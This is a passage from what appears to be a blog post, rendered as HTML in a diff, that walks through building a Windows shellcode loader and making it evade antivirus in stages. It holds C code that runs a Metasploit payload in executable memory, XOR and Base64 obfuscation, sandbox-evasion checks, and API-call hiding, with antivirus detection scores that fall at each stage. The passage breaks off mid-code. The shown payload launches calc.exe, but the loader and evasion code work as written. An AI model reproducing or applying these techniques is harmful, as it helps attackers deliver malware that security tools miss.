+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x05</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x89</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xda</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x00</span>
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Length of payload array
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> payload_len <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(<span style="color:#66d9ef">sizeof</span>(payload)<span style="color:#f92672">/</span><span style="color:#66d9ef">sizeof</span>(payload[<span style="color:#ae81ff">0</span>]));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/// Main Function
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">///
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// Returns
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">///  0 - OK
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// -1 - VirtualAlloc() failed
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// -2 - VirtualProtect() failed
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// -3 - CreateThread() failed
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// -4 - WaitForSingleObject() failed
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>    BOOL rv;
+</span></span><span style="display:flex;"><span>    HANDLE th;
+</span></span><span style="display:flex;"><span>    DWORD _event <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> exec_mem;
+</span></span><span style="display:flex;"><span>    DWORD oldprotect <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate a memory buffer for payload
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    exec_mem <span style="color:#f92672">=</span> VirtualAlloc(<span style="color:#ae81ff">0</span>, payload_len, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (exec_mem <span style="color:#f92672">==</span> NULL){
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// fprintf(stderr, &#34;VirtualAlloc Failed with error code: %d\n&#34;, GetLastError());
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Copy payload to new buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    RtlMoveMemory(exec_mem, payload, payload_len);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Make new buffer as executable
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    rv <span style="color:#f92672">=</span> VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, <span style="color:#f92672">&amp;</span>oldprotect);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( rv <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> ) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// fprintf(stderr, &#34;VirtualProtect Failed with error code: %d\n&#34;, GetLastError());
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Create Thread To run shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    th <span style="color:#f92672">=</span> CreateThread(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE) exec_mem, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (th <span style="color:#f92672">==</span> NULL){
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// fprintf(stderr, &#34;CreateThread Failed with error code: %d\n&#34;, GetLastError());
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    _event <span style="color:#f92672">=</span> WaitForSingleObject(th, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(_event <span style="color:#f92672">==</span> WAIT_FAILED){
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// fprintf(stderr, &#34;WaitForSingleObject Failed with error code: %d\n&#34;, GetLastError());
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The program basically takes the payload generated by Metasploit, creates a memory region with <strong>Read</strong> and <strong>Write</strong> permissions to hold the same, followed by changing the permissions of the region to <strong>Read</strong> and <strong>Execute</strong> before finally creating a thread to execute it.</p>
+<p>The above program can be compiled with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:level0.exe /SUBSYSTEM:CONSOLE /MACHINE:x6
+</span></span></code></pre></div><p>This should create a <code>level0.exe</code> executable file in the current directory which, when run, pops up the <code>calc.exe</code> program.</p>
+<h3 id="antiscan-analysis" >Antiscan Analysis
+<span>
+    <a href="#antiscan-analysis">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>We see that most AV engines flag the binary and rightfully so because it barely contains any obfuscation and Metasploit payloads have well-defined signatures at this point.</p>
+<p><a href="https://antiscan.me/scan/new/result?id=0HTHHCYEJBjq"><strong>Antiscan Score: 13/26</strong></a></p>
+<p><img src="https://antiscan.me/images/result/0HTHHCYEJBjq.png" alt="Level0 Analysis"></p>
+<h2 id="level-1---xor-it" >Level 1 - XOR it!
+<span>
+    <a href="#level-1---xor-it">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p>The next thing we do is try to try be a little sneaky and encrypt the payload using the simplest encryption technique out there: XOR&rsquo;ing it.</p>
+<p>With our payload from Level0, any dumb stupid AV engine can just run a simple signature check or even use something like the <code>strings</code> command to know that the executable hence produced is major sus. [It would be kinda worrying if it didn&rsquo;t flag this simple thing]</p>
+<p>Now coming back to XOR, we would first need a key to encrypt stuff with. For this, I chose a string which was already present in the Level0 executable so as to not arouse any suspicion.</p>
+<p>We can then obtain the encrypted string from our <code>obfuscator.py</code> script using <code>Obsfucator.level1()</code>. As for the executable code, just for the sake of readibilty we add a header file <code>headers/obfuscators.h</code>  which contains the <code>XOR</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// XOR two strings
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">XOR</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> payload, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> payload_len, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> xor_key, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> xor_key_len){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> j;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> payload_len; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (j <span style="color:#f92672">==</span> xor_key_len) j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        payload[i] <span style="color:#f92672">=</span> payload[i] <span style="color:#f92672">^</span> xor_key[j];
+</span></span><span style="display:flex;"><span>        j<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And then, we call the <code>XOR()</code> function right before copying the payload to the target memory address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>XOR(payload, payload_len, XOR_KEY, xor_key_len);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Copy payload to new buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>RtlMoveMemory(exec_mem, payload, payload_len);
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Finally, we compile it with:</p>
+<pre tabindex="0"><code>cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /I &#34;headers&#34; /link /OUT:executables\level0.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 
+</code></pre><h3 id="antiscan-analysis-1" >Antiscan Analysis
+<span>
+    <a href="#antiscan-analysis-1">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>The encryprion does bring down the detection rates a bittle but still, there are ways to go :)</p>
+<p><a href="https://antiscan.me/scan/new/result?id=6huOmULlMd25"><strong>Antiscan Score: 9/26</strong></a></p>
+<p><img src="https://antiscan.me/images/result/6huOmULlMd25.png" alt="Level1 Analysis"></p>
+<h2 id="level-2---sleep-patching-sandbox" >Level 2 - Sleep Patching Sandbox
+<span>
+    <a href="#level-2---sleep-patching-sandbox">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p>Taking a short detour from the usual from playing with the shell code, we try and implement some sandbox detection techiniques, starting off with <em><strong>&ldquo;Sleep Patching Sandboxes&rdquo;</strong></em>. Accoring to <a href="www.isaca.org">ICASA</a>:</p>
+<blockquote>
+<p>“Sleep Patching Sandboxes will patch the sleep function to try to outmaneuver malware that uses time delays. In response, malware will check to see if time was accelerated. Malware will get the timestamp, go to sleep and then again get the timestamp when it wakes up. The time difference between the timestamps should be the same duration as the amount of time the malware was programmed to sleep. If not, then the malware knows it is running in an environment that is patching the sleep function, which would only happen in a sandbox.”</p>
+</blockquote>
+<p>Thus to bypass this, we implement the following function in <code>sandbox.h</code> to check for accelerated time:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/// User defined PPDs
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define L_INTERVAL  950    </span><span style="color:#75715e">// Lower Time Limit
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define INTERVAL    1000   </span><span style="color:#75715e">// Mean  Time Limit
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define U_INTERVAL  1050   </span><span style="color:#75715e">// Upper Time Limit
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">__check_sleep_patch</span>(){
+</span></span><span style="display:flex;"><span>    DWORD startCount <span style="color:#f92672">=</span> GetTickCount();
+</span></span><span style="display:flex;"><span>    Sleep(INTERVAL);
+</span></span><span style="display:flex;"><span>    DWORD endCount <span style="color:#f92672">=</span> GetTickCount();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    DWORD timeSpan <span style="color:#f92672">=</span> endCount <span style="color:#f92672">-</span> startCount;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((L_INTERVAL <span style="color:#f92672">&gt;</span> timeSpan) <span style="color:#f92672">&amp;&amp;</span> (timeSpan <span style="color:#f92672">&gt;</span> U_INTERVAL)){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Thus if the sandbox is accelerating time, then the <code>timeSpan</code> value wouldn&rsquo;t be in the range <code>L_INTERVAL</code> and <code>U_INTERVAL</code>, hence signifying that the program is running in a sandbox, thereby prompting the program to exit without executing any shellcode in order to avoid detection.</p>
+<p>The program is compiled with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>cl.exe <span style="color:#f92672">/</span>nologo <span style="color:#f92672">/</span>Ox <span style="color:#f92672">/</span>MT <span style="color:#f92672">/</span>W0 <span style="color:#f92672">/</span>GS<span style="color:#f92672">-</span> <span style="color:#f92672">/</span>DNDEBUG <span style="color:#f92672">/</span>Tcimplant.cpp <span style="color:#f92672">/</span>I <span style="color:#e6db74">&#34;headers&#34;</span> <span style="color:#f92672">/</span>link <span style="color:#f92672">/</span>OUT:executables<span style="color:#960050;background-color:#1e0010">\</span>level2.exe <span style="color:#f92672">/</span>SUBSYSTEM:CONSOLE <span style="color:#f92672">/</span>MACHINE:x64 
+</span></span></code></pre></div><h3 id="antiscan-analysis-2" >Antiscan Analysis
+<span>
+    <a href="#antiscan-analysis-2">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>Okay, so this did not help much with the detection rates, rather it increased the detection rate. However, we will give it the benefit of doubt and assume that there are some false positives. Another possible explanation might be the fact that some AV engines are flagging the signature for the function. Nevertheless, we keep it in our program and try to optimize it in the future.</p>
+<p><a href="https://antiscan.me/scan/new/result?id=qG7jq02xPNF9"><strong>Antiscan Score: 11/26</strong></a></p>
+<p><img src="https://antiscan.me/images/result/qG7jq02xPNF9.png" alt="Level2 Analysis"></p>
+<h2 id="level-3---where-is-the-cursor" >Level 3 - Where is the cursor?
+<span>
+    <a href="#level-3---where-is-the-cursor">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p>Again, instead of tampering with the shellcode itself, we are employing some more sandbox detection techniques. This time, we are monitoring for User Input, which in this case, is the cursor movement as such:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">__check_cursor_activity</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> __infinity_loop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    POINT p1, p2;
+</span></span><span style="display:flex;"><span>    BOOL res1, res2;
+</span></span><span style="display:flex;"><span>    HDESK desktop_handle;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Switch to input desktop if different from current one
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    desktop_handle <span style="color:#f92672">=</span> OpenInputDesktop(<span style="color:#ae81ff">0</span>, TRUE, GENERIC_READ);
+</span></span><span style="display:flex;"><span>    SetThreadDesktop(desktop_handle);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// The GetCurorPos() can fail at times so just retry it 5 times and 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// if it still fails, then exit out with an error code
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
+</span></span><span style="display:flex;"><span>        res1 <span style="color:#f92672">=</span> GetCursorPos(<span style="color:#f92672">&amp;</span>p1);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (res1) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        Sleep(INTERVAL);
+</span></span><span style="display:flex;"><span>        __infinity_loop <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (__infinity_loop <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    __infinity_loop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    Sleep(INTERVAL<span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
+</span></span><span style="display:flex;"><span>        res2 <span style="color:#f92672">=</span> GetCursorPos(<span style="color:#f92672">&amp;</span>p2);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (res2) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        Sleep(INTERVAL);
+</span></span><span style="display:flex;"><span>        __infinity_loop <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (__infinity_loop <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (res1 <span style="color:#f92672">&amp;&amp;</span> res2){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (p1.x<span style="color:#f92672">==</span>p2.x <span style="color:#f92672">||</span> p1.y <span style="color:#f92672">==</span> p2.y <span style="color:#f92672">||</span> ((p1.x<span style="color:#f92672">-</span>p2.x)<span style="color:#f92672">==</span>(p1.y<span style="color:#f92672">-</span>p2.y))){
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We are keeping a track of the Cursor position. If the cursor doesn&rsquo;t move for a while then we exit out of the program without running any of that suspicious shell code.</p>
+<h3 id="antiscan-analysis-3" >Antiscan Analysis
+<span>
+    <a href="#antiscan-analysis-3">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>This seemed to have drastically bring down the detection scores. Thats&rsquo;s a huge improvement considering the barely tampered with payload.</p>
+<p><a href="https://antiscan.me/scan/new/result?id=iyKaH5ChMD18"><strong>Antiscan Score: 8/26</strong></a></p>
+<p><img src="https://antiscan.me/images/result/iyKaH5ChMD18.png" alt="Level3 Analysis"></p>
+<h2 id="level-4---going-bases" >Level 4 - Going Bases
+<span>
+    <a href="#level-4---going-bases">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p>Next up, we try to encode our payload using the good ol&rsquo; <strong>Base64</strong> encoding technique to mask our payload a tad bit more. We generate the Base64 encoded payload using <code>Obfuscator.level2()</code> which does everything upto <code>Obfuscator.level1()</code> plus base64 encodes the whole thing. This is just one step out many more which we can employ to add an extra layer of obfuscation to our payload</p>
+<h3 id="antiscan-analysis-4" >Antiscan Analysis
+<span>
+    <a href="#antiscan-analysis-4">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>This doesn&rsquo;t really have such an adverse effect on the detection rates. However, any obfuscation is a plus in the end.</p>
+<p><a href="https://antiscan.me/scan/new/result?id=YkOZYbkCWBnr"><strong>Antiscan Score: 6/26</strong></a></p>
+<p><img src="https://antiscan.me/images/result/YkOZYbkCWBnr.png" alt="Level4 Analysis"></p>
+<h2 id="level-5---where-did-the-functions-go" >Level 5 - Where did the functions go?
+<span>
+    <a href="#level-5---where-did-the-functions-go">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p>One of the methods AV engines flag malicious programs is by looking at the various functions they call at runtime as well as by using methods like <code>string</code> analysis. So what if we could just do away with that? We achieve this using two methods:</p>
+<ul>
+<li>By replacing our easy-to-read function names with more sinister(i.e, random) ones. The <code>translate.txt</code> file corelates the original functions with the translated ones</li>
+<li>As for native windows functions, instead of directly calling them, we first obtain the handle to the corresponding system DLL and use the <code>GetProcAddress()</code> function to retrieve the address of the corresponding function. To add to the obfuscation, we also XOR the string arguments passed to the function so as to not leave any trace behind. For example, we obfuscate <code>VirtualAlloc()</code> as such:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/// In definitions.h
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// The function signature
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>LPVOID (WINAPI <span style="color:#f92672">*</span> _VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Typedef
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> LPVOID (<span style="color:#66d9ef">__stdcall</span> <span style="color:#f92672">*</span> __type_virtualalloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// XOR Encrypted function name
